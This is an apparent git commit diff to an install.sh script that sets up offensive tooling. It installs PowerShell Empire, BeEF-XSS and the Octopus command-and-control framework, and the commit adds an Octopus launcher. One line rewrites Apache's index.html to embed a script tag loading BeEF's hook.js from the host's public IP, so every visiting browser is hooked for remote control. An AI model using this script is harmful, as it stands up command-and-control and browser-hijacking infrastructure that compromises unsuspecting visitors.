a12a7453e9323ef27cf5a9c68a5aa0b0b2fb519b
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-07-04 19:21:37 +0200

    oct

--- install.sh
+++ install.sh
@@ -8,6 +8,7 @@ apt install powershell-empire -y
 apt install beef-xss -y
 apt install apache2 -y 
 apt update; apt install git -y; git clone https://github.com/mhaskar/Octopus/ /opt/Octopus; cd /opt/Octopus/; apt install python3-pip -y ; export LC_ALL=C ;  pip3 install -r requirements.txt;apt install mono-devel -y
+echo "cd /opt/Octopus/;python3 octopus.py" > /usr/bin/octopus;chmod +x /usr/bin/octopus
 mv /var/www/html/index.html /var/www/html/index.html.bak
 echo "it's working<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
 systemctl enable apache2.service
